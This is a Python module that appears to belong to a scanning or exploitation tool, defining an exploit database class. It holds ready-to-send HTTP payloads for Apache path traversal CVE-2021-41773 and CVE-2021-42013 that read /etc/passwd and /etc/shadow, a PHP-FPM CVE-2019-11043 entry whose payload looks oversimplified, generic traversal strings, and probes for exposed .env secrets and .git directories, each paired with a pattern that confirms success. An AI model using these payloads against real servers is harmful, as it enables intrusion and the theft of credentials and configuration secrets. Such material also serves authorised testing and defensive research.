#!/usr/bin/env python3
"""
Exploit Database - Pre-built exploit templates for common CVEs
"""
import json
from typing import Dict, List, Optional
from pathlib import Path
from utils.logger import logger


class ExploitDB:
    """Database of exploit templates for known CVEs"""
    
    # Built-in exploit templates
    EXPLOITS = {
        'CVE-2021-41773': {
            'name': 'Apache 2.4.49 Path Traversal',
            'cve': 'CVE-2021-41773',
            'type': 'path_traversal',
            'severity': 'critical',
            'description': 'Path traversal vulnerability in Apache HTTP Server 2.4.49',
            'payloads': [
                {
                    'name': 'Read /etc/passwd',
                    'method': 'GET',
                    'paths': [
                        '/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd',
                        '/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd',
                        '/images/.%2e/.%2e/.%2e/.%2e/etc/passwd',
                        '/.%2e/.%2e/.%2e/.%2e/etc/passwd',
                    ],
                    'validation': {
                        'type': 'content',
                        'pattern': 'root:x:0:0:',
                        'description': 'Check for /etc/passwd content'
                    }
                },
                {
                    'name': 'Read /etc/shadow',
                    'method': 'GET',
                    'paths': [
                        '/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/shadow',
                        '/icons/.%2e/.%2e/.%2e/.%2e/etc/shadow',
                    ],
                    'validation': {
                        'type': 'content',
                        'pattern': 'root:',
                        'description': 'Check for /etc/shadow content'
                    }
                }
            ],
            'references': [
                'https://github.com/blasty/CVE-2021-41773',
                'https://nvd.nist.gov/vuln/detail/CVE-2021-41773'
            ]
        },
        
        'CVE-2021-42013': {
            'name': 'Apache 2.4.50 Path Traversal & RCE',
            'cve': 'CVE-2021-42013',
            'type': 'path_traversal',
            'severity': 'critical',
            'description': 'Path traversal and RCE in Apache HTTP Server 2.4.50',
            'payloads': [
                {
                    'name': 'Read /etc/passwd',
                    'method': 'GET',
                    'paths': [
                        '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
                        '/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd',
                    ],
                    'validation': {
                        'type': 'content',
                        'pattern': 'root:x:0:0:',
                        'description': 'Check for /etc/passwd content'
                    }
                }
            ],
            'references': [
                'https://nvd.nist.gov/vuln/detail/CVE-2021-42013'
            ]
        },
        
        'CVE-2019-11043': {
            'name': 'PHP-FPM RCE',
            'cve': 'CVE-2019-11043',
            'type': 'rce',
            'severity': 'critical',
            'description': 'Remote Code Execution in PHP-FPM',
            'payloads': [
                {
                    'name': 'Execute phpinfo()',
                    'method': 'GET',
                    'paths': [
                        '/index.php?a=' + 'A' * 2048,
                    ],
                    'headers': {
                        'User-Agent': 'Mozilla/5.0'
                    },
                    'validation': {
                        'type': 'content',
                        'pattern': 'PHP Version',
                        'description': 'Check for phpinfo() output'
                    }
                }
            ],
            'references': [
                'https://nvd.nist.gov/vuln/detail/CVE-2019-11043'
            ]
        },
        
        # Generic exploit templates
        'PATH_TRAVERSAL_GENERIC': {
            'name': 'Generic Path Traversal',
            'cve': None,
            'type': 'path_traversal',
            'severity': 'high',
            'description': 'Generic path traversal attack',
            'payloads': [
                {
                    'name': 'Read sensitive files',
                    'method': 'GET',
                    'paths': [
                        '/../../../etc/passwd',
                        '/../../etc/passwd',
                        '/../etc/passwd',
                        '/....//....//....//etc/passwd',
                        '/.%2e/.%2e/.%2e/etc/passwd',
                    ],
                    'validation': {
                        'type': 'content',
                        'pattern': 'root:',
                        'description': 'Check for file content'
                    }
                }
            ]
        },
        
        'EXPOSED_ENV': {
            'name': 'Exposed .env File',
            'cve': None,
            'type': 'information_disclosure',
            'severity': 'high',
            'description': 'Publicly accessible .env configuration file',
            'payloads': [
                {
                    'name': 'Read .env file',
                    'method': 'GET',
                    'paths': [
                        '/.env',
                        '/.env.local',
                        '/.env.production',
                        '/.env.development',
                        '/api/.env',
                        '/app/.env',
                    ],
                    'validation': {
                        'type': 'content',
                        'pattern': '(?i)(api_key|secret|password|token|database)',
                        'description': 'Check for sensitive configuration'
                    }
                }
            ]
        },
        
        'EXPOSED_GIT': {
            'name': 'Exposed .git Directory',
            'cve': None,
            'type': 'information_disclosure',
            'severity': 'high',
            'description': 'Publicly accessible .git directory',
            'payloads': [
                {
                    'name': 'Access .git/config',
                    'method': 'GET',
                    'paths': [
                        '/.git/config',
                        '/.git/HEAD',
                        '/.git/index',
                    ],
                    'validation': {
                        'type': 'content',
                        'pattern': '\\[core\\]|ref:',
                        'description': 'Check for git configuration'
                    }
                }
            ]
        }
    }
    
    def __init__(self, custom_exploits_dir: str = None):
        self.exploits = self.EXPLOITS.copy()
        self.custom_exploits_dir = custom_exploits_dir
        
        # Load custom exploits if directory provided
        if custom_exploits_dir and Path(custom_exploits_dir).exists():
            self._load_custom_exploits(custom_exploits_dir)
    
    def _load_custom_exploits(self, exploits_dir: str):
        """Load custom exploit templates from directory"""
        try:
            exploits_path = Path(exploits_dir)
            for exploit_file in exploits_path.glob('**/*.json'):
                with open(exploit_file, 'r') as f:
                    exploit = json.load(f)
                    cve_id = exploit.get('cve') or exploit_file.stem.upper()
                    self.exploits[cve_id] = exploit
                    logger.info(f"Loaded custom exploit: {cve_id}")
        except Exception as e:
            logger.error(f"Error loading custom exploits: {e}")
    
    def get_exploit(self, cve_id: str) -> Optional[Dict]:
        """Get exploit template by CVE ID"""
        return self.exploits.get(cve_id)
    
    def get_exploits_by_type(self, exploit_type: str) -> List[Dict]:
        """Get all exploits of a specific type"""
        return [
            exploit for exploit in self.exploits.values()
            if exploit.get('type') == exploit_type
        ]
    
    def get_all_cve_exploits(self) -> List[Dict]:
        """Get all CVE-specific exploits (exclude generic)"""
        return [
            exploit for cve_id, exploit in self.exploits.items()
            if exploit.get('cve') is not None
        ]
    
    def get_generic_exploits(self) -> List[Dict]:
        """Get generic exploit templates"""
        return [
            exploit for exploit in self.exploits.values()
            if exploit.get('cve') is None
        ]
    
    def search_exploits(self, query: str) -> List[Dict]:
        """Search exploits by name, description, or CVE ID"""
        query_lower = query.lower()
        results = []
        
        for cve_id, exploit in self.exploits.items():
            if (query_lower in cve_id.lower() or
                query_lower in exploit.get('name', '').lower() or
                query_lower in exploit.get('description', '').lower()):
                results.append(exploit)
        
        return results
    
    def list_all(self) -> Dict[str, Dict]:
        """List all available exploits"""
        return self.exploits
    
    def export_exploit_summary(self) -> Dict:
        """Export summary of available exploits"""
        return {
            'total_exploits': len(self.exploits),
            'cve_specific': len(self.get_all_cve_exploits()),
            'generic': len(self.get_generic_exploits()),
            'by_type': {
                'path_traversal': len(self.get_exploits_by_type('path_traversal')),
                'rce': len(self.get_exploits_by_type('rce')),
                'sqli': len(self.get_exploits_by_type('sqli')),
                'information_disclosure': len(self.get_exploits_by_type('information_disclosure')),
            },
            'exploits': list(self.exploits.keys())
        }
